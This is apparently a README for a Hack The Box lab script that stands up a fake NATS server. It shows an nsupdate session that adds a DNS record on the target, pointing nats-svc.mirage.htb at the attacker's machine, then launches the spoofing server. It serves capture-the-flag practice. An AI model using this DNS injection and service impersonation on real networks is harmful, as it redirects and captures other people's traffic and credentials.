# HTB Mirage

WriteUp: [https://gunzf0x.github.io/pentesting/posts/mirage/](https://gunzf0x.github.io/pentesting/posts/mirage/)

Script for [HTB Mirage](https://www.hackthebox.com/machines/mirage) to start a temporal `Network Application Transfer Standard` (`NATS`) server on port `4222`.

## Usage
Add a `DNS` record pointing to our attacker machine with `nsupdate`:
```shell-session
$ nsupdate

> server 10.129.221.181
> update add nats-svc.mirage.htb 3600 A 10.10.16.80
> send
```
Where `10.129.221.181` is the target machine and `10.10.16.80` is our attacker machine.

And run the server:
```shell-session
$ python3 fake_nats_server.py
```
